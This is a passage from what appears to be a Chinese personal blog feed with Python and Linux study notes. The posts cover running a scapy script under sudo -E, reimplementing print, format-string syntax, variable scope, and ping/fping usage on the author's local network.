        <content type="html"><![CDATA[<p>之前在 sudo 模式下，运行，Python脚本文件时，也遇到这个问题，但那是遇到的模块文件都是可以在用户权限下运行的，我只是不小心在这里root 下想运行而已。</p><h2 id="问题">问题</h2><p>今天在学习 scapy 模块进行了 IP 欺骗的时候，我发现它必须在这里 root权限下运行，否则报错<code>PermissionError: [Errno 1] Operation not permitted</code>，但是root 下用户还报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python spoofing.py</span><br><span class="line">[sudo] password <span class="keyword">for</span> violetv:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;spoofing.py&quot;</span>, line <span class="number">3</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;scapy&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="解决方法">解决方法</h2><p>使用的 <code>sudo</code> 命令的 <code>-E</code> 选项,<code>sudo -E python spoofing.py</code></p><h2 id="原因">原因</h2><p>由于安全策略，默认情况下， root用户不会加载普通用户的环境变量（这里指 Python 的环境变量），而我的Python 包又是只安装在用户目录下的，因此报错。</p><p>可以通过使用 <code>sudo</code> 的 <code>-E</code>选项告诉安全策略，用户想要在切换到 sudo 之后保留自己的环境变量。</p><p>通过了 <code>man sudo</code> 可得：</p><blockquote><p>-E, --preserve-env</p></blockquote><pre><code>    Indicates to the security policy that the user wishes to    preserve their existing environment variables.  The secu‐    rity policy may return an error if the user does not have    permission to preserve the environment.</code></pre><blockquote><p>--preserve-env=list</p></blockquote><pre><code>    Indicates to the security policy that the user wishes to    add the comma-separated list of environment variables to    those preserved from the user&#39;s environment.  The security    policy may return an error if the user does not have per‐    mission to preserve the environment.  This option may be    specified multiple times.</code></pre><h2 id="参考资料">参考资料</h2><blockquote><p><ahref="https://stackoverflow.com/questions/50315645/cannot-run-python-script-using-sudo">Cannotrun Python script using sudo</a> &gt; <ahref="https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root">PYTHONPATHnot working for sudo on GNU/Linux (works for root)</a> &gt; <ahref="https://blog.csdn.net/ZCShouCSDN/article/details/84990674">Python之 新手安装详解 、安装目录说明 及 修改 pip 默认包安装位置</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自己实现 python print 函数</title>
      <link href="/blog/2020/07/21/programming/python/problems/self_print/"/>
      <url>/blog/2020/07/21/programming/python/problems/self_print/</url>
      
        <content type="html"><![CDATA[<p>今天复习 Python 的输入输出，看到之前的笔记只写了 print 的底层是sys.stdout， 而没有再细说。于是，心想它是怎么使用 sys.stdout 实现的呢？于是又仔细研究了一下 python 函数的各个参数，遂自己写了一个 print。就当练习语法和玩耍了，哈哈。</p><h2 id="知识点">知识点</h2><ol type="1"><li><p>多值参数 一个 <code>*</code>： 元组; 两个星 <code>*</code>:字典</p></li><li><p>列表推导式</p></li><li><p><code>sys.stdout</code> 标准输出流</p></li><li><p><ahref="https://docs.python.org/zh-cn/3.8/library/typing.html">Python类型标注支持</a></p><ul class="task-list"><li><label><input type="checkbox" />Python 类型标注</label></li></ul></li><li><p>if-else 表达式，还是 <code>or</code> 写的过程中， 我本来准备将<code>file</code> 参数设置成 <code>None</code> 的，因为按理说，可变对象参数需要使用 None作为的默认值，从而避免对编译时生成的默认参数对象进行修改，造成意外事故。</p><p>如果要使用 <code>file=None</code> 的话，那输出那里就需要判断一下</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> file:</span><br><span class="line">    file.write(output_content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.stdout.write(output_content)</span><br></pre></td></tr></table></figure></p><p>但是，感觉很不简洁，于是使用 <code>or</code> 进行条件判断，并好奇if-else 和 or 的优劣，就搜索到了 <ahref="https://stackoverflow.com/questions/51802974/if-else-vs-or-operation-for-none-check">stackoverflow的文章</a>，还是 <code>or</code> 性能好。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.stdout = file <span class="keyword">or</span> sys.stdout</span><br><span class="line">sys.stdout.write(output_content)</span><br></pre></td></tr></table></figure></p><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://foofish.net/python-tricks.html">Python陷阱：为什么不能用可变对象作为默认参数的值</a></label></li></ul></li><li><p>最终我又换成了 <code>file=sys.stdout</code>，根据：</p><ol type="1"><li><p><ahref="https://stackoverflow.com/questions/42762120/sys-stdout-as-default-function-argument">stackoverflow一篇文章</a></p></li><li><p><ahref="https://docs.python.org/3.5/library/functions.html?highlight=built#print">Python官方文档 print 默认参数</a></p></li></ol></li></ol><h2 id="代码">代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_print</span>(<span class="params">*obj, sep: <span class="built_in">str</span> = <span class="string">&quot; &quot;</span>, end: <span class="built_in">str</span> = <span class="string">&quot;\n&quot;</span>, file=sys.stdout, flush: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    str_converted = [<span class="built_in">str</span>(obj_item) <span class="keyword">for</span> obj_item <span class="keyword">in</span> obj]</span><br><span class="line">    output_content = sep.join(str_converted)+end</span><br><span class="line"></span><br><span class="line">    file.write(output_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flush:</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 使用测试</span></span><br><span class="line">    my_print(<span class="string">&quot;You&quot;</span>, <span class="string">&quot;Me&quot;</span>, sep=<span class="string">&quot; ^--^ &quot;</span>, end=<span class="string">&quot;\nGo!\n&quot;</span>)</span><br><span class="line">    my_print([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), &#123;</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Violetu&quot;</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;, sep=<span class="string">&quot;\n&quot;</span>, end=<span class="string">&quot;\nThis is the end!\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;test.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        my_print(<span class="string">f&quot;I&#x27;m the text written to <span class="subst">&#123;filename&#125;</span>&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">f&quot;cat <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://stackoverflow.com/questions/42762120/sys-stdout-as-default-function-argument">sys.stdoutas default function argument</a></li><li><ahref="https://stackoverflow.com/questions/51802974/if-else-vs-or-operation-for-none-check">if-elsevs “or” operation for None-check</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python format 格式化输出</title>
      <link href="/blog/2020/07/21/programming/python/1.basic/2.format_output/"/>
      <url>/blog/2020/07/21/programming/python/1.basic/2.format_output/</url>
      
        <content type="html"><![CDATA[<p>格式化字符串的函数 <code>str.format()</code> 与 <code>f-string</code>的格式几乎一致，因此我把它放在一起学习与记录。</p><h2 id="member-and-element-access">Member and Element Access</h2><p>format 函数可以接受不限个参数，位置可以不按顺序。</p><ol type="1"><li><p>不设置指定位置序号， 则按默认顺序访问</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">14</span>]: <span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line">Out[<span class="number">14</span>]: <span class="string">&#x27;hello, world&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>指定位置序号，则按照指定的顺序访问</p><p>对 format()括号中的参数编号，然后前面字符串需要哪个位置的，便填写对应序号。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">16</span>]: <span class="string">&quot;&#123;1&#125;, &#123;0&#125;, &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;value_0&quot;</span>, <span class="string">&quot;value_1&quot;</span>)</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">&#x27;value_1, value_0, value_1&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>通过名字访问</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: name = <span class="string">&quot;Violetu&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: sex=<span class="string">&quot;male&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: <span class="string">&quot;&#123;sex&#125;, &#123;name&#125;&quot;</span>.<span class="built_in">format</span>(name=name, sex=sex)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;male, Violetu&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>通过索引访问</p><p>这里的 <code>0[0]</code> 是指第零个元素（person）的索引 0 位置。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: person = [<span class="string">&quot;Violetu&quot;</span>, <span class="string">&quot;male&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: <span class="string">&quot;name: &#123;0[0]&#125;, sex: &#123;0[1]&#125;&quot;</span>.<span class="built_in">format</span>(person)</span><br><span class="line">Out[<span class="number">21</span>]: <span class="string">&#x27;name: Violetu, sex: male&#x27;</span></span><br></pre></td></tr></table></figure></p><p>注： 这里的 0 不可以省略。</p></li><li><p>通过属性访问</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: <span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    ...:     <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">    ...:         self.value = value</span><br><span class="line">    ...: my_value = test(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: <span class="string">&quot;value is &#123;0.value&#125;&quot;</span>.<span class="built_in">format</span>(my_value)</span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;value is 6&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>通过键值访问</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">42</span>]: <span class="string">&quot;name: &#123;name&#125;, sex: &#123;sex&#125;&quot;</span>.<span class="built_in">format</span>(**person_dict)</span><br><span class="line">Out[<span class="number">42</span>]: <span class="string">&#x27;name: Violetu, sex: male&#x27;</span></span><br></pre></td></tr></table></figure></p></li></ol><h2 id="numerical-representation">Numerical Representation</h2><table><colgroup><col style="width: 29%" /><col style="width: 70%" /></colgroup><thead><tr class="header"><th style="text-align: left;"><code>'&#123;:x&#125;'.format(100)</code></th><th style="text-align: left;">Hexadecimal representationOutput:<code>64</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>'&#123;:X&#125;'.format(3487)</code></td><td style="text-align: left;">Hexadecimal representation (uppercaseletters) <br>Output: <code>D9F</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:#x&#125;'.format(100)</code></td><td style="text-align: left;">Hexadecimal representation (including the<code>0x</code>) <br>Output: <code>0x64</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:b&#125;'.format(100)</code></td><td style="text-align: left;">Binary representation <br>Output:<code>1100100</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:c&#125;'.format(100)</code></td><td style="text-align: left;">Character representation <br>Output:<code>d</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:d&#125;'.format(100)</code></td><td style="text-align: left;">Decimal representation (default)<br>Output: <code>100</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:,&#125;'.format(1000000)</code></td><td style="text-align: left;">With thousands separator <br>Output:<code>1,000,000</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:o&#125;'.format(100)</code></td><td style="text-align: left;">Octal representation <br>Output:<code>144</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:n&#125;'.format(100)</code></td><td style="text-align: left;">Like <code>d</code>, but uses localeinformation for separators <br>Output: <code>100</code></td></tr><tr class="odd"><tdstyle="text-align: left;"><code>'&#123;:e&#125;'.format(0.0000000001)</code></td><td style="text-align: left;">Exponent notation <br>Output:<code>1.000000e-10</code></td></tr><tr class="even"><tdstyle="text-align: left;"><code>'&#123;:E&#125;'.format(0.0000000001)</code></td><td style="text-align: left;">Exponent notation (capital 'E')<br>Output: <code>1.000000E-10</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:f&#125;'.format(3/14.0)</code></td><td style="text-align: left;">Fixed point <br>Output:<code>0.214286</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:g&#125;'.format(3/14.0)</code></td><td style="text-align: left;">General format <br>Output:<code>0.214286</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:%&#125;'.format(0.66)</code></td><td style="text-align: left;">Percentage <br>Output:<code>66.000000%</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:.3&#125;'.format(0.214286)</code></td><td style="text-align: left;">Precision <br>Output:<code>0.214</code></td></tr></tbody></table><h2 id="field-width-and-alignment">Field Width and Alignment</h2><p><code>&#123;number&#125;:&#123;padding&#125;&#123;align&#125;&#123;+&#125;&#123;width&#125;&#123;type&#125;</code></p><h2 id="整数-typed">整数 type=d</h2><ol type="1"><li>padding character:冒号后面，对齐符号前边写，只能是一个字符，不指定则默认是用空格填充。</li><li>align symbol： <code>^</code>, <code>&lt;</code>, <code>&gt;</code>分别是居中、左对齐、右对齐， 默认是右对齐。</li><li><code>+</code>: 表示在正数前显示 +，负数前显示 -； （空格）表示在正数前加空格</li><li>width：宽度，只有宽度大于数字宽度事，对齐才有意义。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">66</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">66</span>]: <span class="string">&#x27;    3&#x27;</span></span><br><span class="line">In [<span class="number">65</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:&lt;5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">65</span>]: <span class="string">&#x27;3    &#x27;</span></span><br><span class="line">In [<span class="number">63</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:x&lt;5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">63</span>]: <span class="string">&#x27;3xxxx&#x27;</span></span><br><span class="line"><span class="comment"># 这个为数字 3, 左对齐， 宽度为 5， 填充字符 `x`。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="number">76</span>]: <span class="string">f&quot;<span class="subst">&#123;-<span class="number">3</span>:+8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">76</span>]: <span class="string">&#x27;      -3&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">82</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:<span class="number">0</span>&lt;+8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">82</span>]: <span class="string">&#x27;+3000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">78</span>]: <span class="string">f&quot;<span class="subst">&#123;-<span class="number">3</span>:-8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">78</span>]: <span class="string">&#x27;      -3&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="字符串-type-为空">字符串 type 为空</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">83</span>]: <span class="string">&#x27;&#123;:*^15&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">Out[<span class="number">83</span>]: <span class="string">&#x27;*****text******&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="小数-typef">小数 type=f</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">86</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3.14159</span>:x&gt;+<span class="number">10.2</span>f&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">86</span>]: <span class="string">&#x27;xxxxx+3.14&#x27;</span></span><br></pre></td></tr></table></figure><p>解释：带符号，宽度为 10， 右对齐，填充 <code>x</code>，保留两位小数。</p><h2 id="conversions">Conversions</h2><table><colgroup><col style="width: 37%" /><col style="width: 62%" /></colgroup><thead><tr class="header"><th><code>'&#123;!r&#125;'.format('string')</code></th><th>Calling <code>repr</code> on argumentsOutput:<code>'string'</code></th></tr></thead><tbody><tr class="odd"><td><code>'&#123;!s&#125;'.format(1.53438987)</code></td><td>Calling <code>str</code> on arguments</td></tr></tbody></table><h2 id="参考文章">参考文章</h2><blockquote><ol type="1"><li><ahref="https://kapeli.com/cheat_sheets/Python_Format_Strings.docset/Contents/Resources/Documents/index">PythonFormat Strings</a></li><li><ahref="https://www.runoob.com/python/att-string-format.html">Pythonformat 格式化函数</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>局部变量与全局变量</title>
      <link href="/blog/2020/07/20/programming/python/1.basic/5.para_gl_local/"/>
      <url>/blog/2020/07/20/programming/python/1.basic/5.para_gl_local/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>全局变量是在函数外部定义的变量，所有函数内部都可以使用这个变量。注意：函数执行时，需要处理变量时会:</p><ol type="1"><li>首先查找<strong>函数内部</strong>是否存在指定名称的局部变量，如果有，直接使用。</li><li>如果没有，查找函数外部是否存在指定名称的<strong>全局变量</strong>，如果有，直接使用。</li><li>如果没有，程序报错。</li></ol><h3 id="注意事项">注意事项</h3><ol type="1"><li><p>函数不能直接修改全局变量的引用，如果直接使用赋值语句，会在函数内部，定义一个局部变量。</p><ul><li><p>全局变量是在函数外部定义的变量(没有定义在某一个函数内)，所有函数内部都可以读取这个变量</p><blockquote><p>提示：在其他编程语言中，大多不推荐使用全局变量 --可变范围太大，导致程序不好维护。 但是在 Python中使用全局变量的场景还是很较多的。</p></blockquote></li><li><p>在函数内部，可以通过全局变量的对象引用获取对应的数据。</p></li><li><p>但是，对于不可变对象来说，不允许使用赋值语句修改其对象引用(可变对象还是可以修改元素的，但也不允许修改其对象引用)</p></li></ul></li><li><p>在函数内部修改全局变量的值如果只是在函数内部访问全局变量，可以直接访问，但是如果要修改全局变量，需要使用 <code>global 全局变量名</code> 提前声明，然后才能修改。</p><ul><li>注意在开发时，应该把模块中的所有全局变量定义在函数上方，这样就可以保证所有函数都能够正常访问到每一个全局变量了</li></ul></li><li><p>全局变量命名的建议</p><ul><li>为了避免局部变量和全局变量出现混淆，在定义全局变量时，有些公司会有一些开发要求，例如:全局变量名前应该增加 <code>g_</code> 或者 'gl_' 的前缀 &gt; 提示:具体的要求格式，各公司要求可能会有些差异。</li></ul></li><li><p>如果局部变量的名字和全局变量的名字相同，Pycharm会在局部变量下方显示一个灰色的虚线。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ping 与 fping</title>
      <link href="/blog/2020/07/18/linux/tools/f_ping/"/>
      <url>/blog/2020/07/18/linux/tools/f_ping/</url>
      
        <content type="html"><![CDATA[<h2 id="ping">ping</h2><h3 id="简介">简介</h3><p><code>info ping</code> 可得：</p><blockquote><p>'ping' uses ICMP datagrams to provoke a response from the chosendestination host, <strong>mainly intending to probe whether it isalive</strong>.</p><p>The used datagram, of type 'ECHO_REQUEST', contains some headerinformation and some additional payload, usually a timestamp. By asuitable choice of payload, different host or router properties aredetectable, as the emitted datagram travels to its destination.</p></blockquote><h3 id="命令">命令</h3><p>通过 <code>ping --help</code> 我学到几个有用的选项：</p><p><code>ping [options] &lt;destination&gt;</code></p><ol type="1"><li><code>&lt;destination&gt;</code> dns name or ip address</li><li><code>-c &lt;count&gt;</code> stop after <code>&lt;count&gt;</code>replies</li><li><code>-i &lt;interval&gt;</code> seconds between sending eachpacket</li><li><code>-w &lt;deadline&gt;</code> reply wait<code>&lt;deadline&gt;</code> in seconds</li><li><code>-f &lt;deadline&gt;</code> flood ping</li></ol><h2 id="fping">fping</h2><h3 id="简介-1">简介</h3><p><code>man ping</code> 可得：</p><blockquote><p>fping is a program like ping which uses the Internet Control MessageProtocol (ICMP) echo request to determine if a target host isresponding.</p><p>fping differs from ping in that you can specify any number of targetson the command line, or specify a file containing the lists of targetsto ping. Instead of sending to one target until it times out or replies,fping will send out a ping packet and move on to the next target in a<strong>round-robin</strong> fashion.</p><p>In the default mode, if a target replies, it is noted and removedfrom the list of targets to check; if a target does not respond within acertain time limit and/or retry limit it is designated asunreachable.</p><p>fping also supports sending a specified number of pings to a target,or looping indefinitely (as in ping ). Unlike ping, <strong>fping ismeant to be used in scripts</strong>, so its output is designed to beeasy to parse.</p></blockquote><h3 id="命令-1">命令</h3><p>通过 <code>man ping</code> 我学到几个有用的选项：</p><ol type="1"><li><p><code>-a, --alive</code> Show systems that are alive.</p></li><li><p><code>-f, --file</code> Read list of targets from a file. Thisoption can only be used by the root user. Regular users should pipe inthe file via stdin: <code>fping &lt; targets_file</code></p></li><li><p><code>-g, --generate addr/mask</code> Generate a target list froma supplied IP netmask, or a starting and ending IP. Specify the netmaskor start/end in the targets portion of the command line. If a networkwith netmask is given, the network and broadcast addresses will beexcluded. ex. To ping the network 192.168.1.0/24, the specified commandline could look like either: <code>fping -g 192.168.1.0/24</code> or<code>fping -g 192.168.1.1 192.168.1.254</code></p></li><li><p><code>-s, --src</code> Print cumulative statistics uponexit.</p></li></ol><p>练习（我的内网 IP 为 <code>192.168.43.79</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fping -s 192.168.43.76 192.168.43.79</span></span><br><span class="line">192.168.43.79 is alive</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">192.168.43.76 is unreachable</span><br><span class="line"></span><br><span class="line">       2 targets</span><br><span class="line">       1 alive</span><br><span class="line">       1 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line"></span><br><span class="line">       1 timeouts (waiting for response)</span><br><span class="line">       5 ICMP Echos sent</span><br><span class="line">       1 ICMP Echo Replies received</span><br><span class="line">       4 other ICMP received</span><br><span class="line"></span><br><span class="line"> 0.05 ms (min round trip time)</span><br><span class="line"> 0.05 ms (avg round trip time)</span><br><span class="line"> 0.05 ms (max round trip time)</span><br><span class="line">        4.076 sec (elapsed real time)</span><br></pre></td></tr></table></figure><p>shell 上显示四部分：</p><ol type="1"><li><p>存活主机 <code>192.168.43.79 is alive</code>；</p></li><li><p>ICMP 差错报文， <strong>标准错误输出信息</strong>，可以用<code>2&gt;/dev/null</code> 去除；</p><p>每个地址最多询问 四次</p></li><li><p>不可达主机：<code>192.168.43.76 is unreachable</code><code>-a</code> 选项便是去除这一部分</p></li><li><p>累计数据 <code>-s</code>选项的作用便是在退出前，输出累计统计数据。</p></li></ol><p><code>-g</code> 选项，根据起、始 IP 生成列表，遍历。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fping -g 192.168.43.76 192.168.43.79 2&gt;/dev/null</span></span><br><span class="line">192.168.43.79 is alive</span><br><span class="line">192.168.43.76 is unreachable</span><br><span class="line">192.168.43.77 is unreachable</span><br><span class="line">192.168.43.78 is unreachable</span><br></pre></td></tr></table></figure><p>常用：<code>fping -ag IP 或起始IP 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ping </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层安全威胁</title>
      <link href="/blog/2020/07/17/network/link_sec/"/>
      <url>/blog/2020/07/17/network/link_sec/</url>
      
